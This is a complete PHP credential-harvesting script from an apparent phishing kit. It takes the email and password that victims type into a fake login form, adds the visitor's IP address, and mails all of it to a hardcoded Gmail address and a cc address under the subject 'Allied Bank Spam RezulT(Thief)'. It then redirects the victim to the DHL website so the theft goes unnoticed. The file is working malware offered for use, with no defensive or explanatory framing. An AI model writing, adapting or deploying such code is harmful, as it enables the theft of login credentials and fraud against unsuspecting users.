<?

$ip = getenv("REMOTE_ADDR");
$message .= "--------------Ali Spam ReZulT-----------------------\n";
$message .= "USERNAME : ".$_POST['email']."\n";
$message .= "Password : ".$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By DAN------------------------------\n";

$recipient = "emekadennis123@gmail.com";
$cc = "abuse@catvanloiconduit.vn";
$subject = "wang";
$headers = "From";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail("$cc", "Allied Bank Spam RezulT(Thief)", $message,$headers);
	 mail("", "Allied Bank Spam RezulT(Thief)", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.dhl.com");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>